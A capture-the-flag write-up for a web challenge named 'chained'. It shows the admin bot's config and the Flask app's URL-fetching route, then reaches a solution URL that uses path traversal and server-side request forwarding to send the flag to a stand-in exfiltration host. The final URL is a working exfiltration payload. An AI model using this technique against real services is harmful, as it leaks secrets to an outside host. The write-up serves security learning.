#### chained
- points earned: 178
#### Where's the flag?
- Looking in `admin-bot.js` I can see that the flag is appended to a url.  Although the exact bot code is not provided, what is provided look slike a config where the `handler` is what will process a URL that I provide.
	```javascript
	import flag from './flag.txt';
	
	function sleep(time) {
	    return new Promise(resolve => {
	        setTimeout(resolve, time)
	    });
	}
	
	export default {
	    id: 'chained',
	    name: 'chained',
	    urlRegex: /^https:\/\/chained\.tjc\.tf\/admin\//,
	    timeout: 10000,
	    handler: async (url, ctx) => {
	        const page = await ctx.newPage();
	        await page.goto(url + flag, { timeout: 3000, waitUntil: 'domcontentloaded' });
	        await sleep(5000);
	    }
	};
	```
#### Investigating the bot
- Based on what I know so far, I wanted to quickly confirm that `urlRegex` is being applied to the url that I provide.
- I launched the bot and provided the URL for my exfil server and got the response `The URL must match ^https:\/\/chained\.tjc\.tf\/admin\/`.
- This confirms that the bot is using validating the url with `urlRegex` which basically just asserts that the url starts with `https://chained.tjc.tf/admin/`.
- With this information, I know that I need to find some type of url-related gadget in challenge application.
#### Investigating the app
- From a UI/UX perspective the app contains a form to submit a url.
- When you submit the form you get redirected to `/?url=<url>`
- At `/?url=<url>` it looks like the page is just reflecting the content of the provided url onto the body of the page.
- The source code shows exactly what's happening.
	```python
	@app.route('/', methods=['GET', 'POST'])
	def index():
	    if request.method == 'POST':
	        url = request.form['url'] or ''
	        if not isSafe(url): return 'Access denied. URL parameter included one or more of the blacklisted keywords.'
	        return redirect(url_for('index', url=url))
	    url = request.args.get('url') or ''
	    if url: 
	        desc = 'The admin will visit your URL.'
	        try: req = 'Your response: ' + requests.get(url).text
	        except: return 'Uh-oh... Try again!'
	    else: req, desc = '', ''
	    return render_template('index.html', q = req, desc=desc)
	```
	- the route just takes the url, sends it to `requests.get()` and the response gets used in the `index.html` tamplate.
- I started thinking about XSS possibilities here but inline js is prevented by a CSP.  In order to bypass this CSP I'd need a js gadget on the target.
	```html
	<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self'; img-src 'none'; object-src 'none';  manifest-src 'none'; ">
	```
- Thinking about what I have so far I quickly realized that I have everything I need to capture the flag.
- If `/?url=<url>` sends a request to the url and the bot just appends a flag to the end of the url that I provide then I can just use something like
	```
	https://chained.tjc.tf/?url=http://exfil.com/?flag=
	```
	- the bot will append the flag to the end and send the request which results in the web app sending a request to `http://exfil.com/?flag=<flag>`.
- But wait, the url that I give to the bot must start with `https://chained.tjc.tf/admin/` where `/admin` gets in the way.
- What about a path traversal?  Something like `https://chained.tjc.tf/admin/../?url=http://exfil.com/?flag=`.
	- A quick test proves that this works.

#### Solution
- Send a url in the following format to the bot.
	```
	https://chained.tjc.tf/admin/../?url=http://exfil.com/?flag=
	```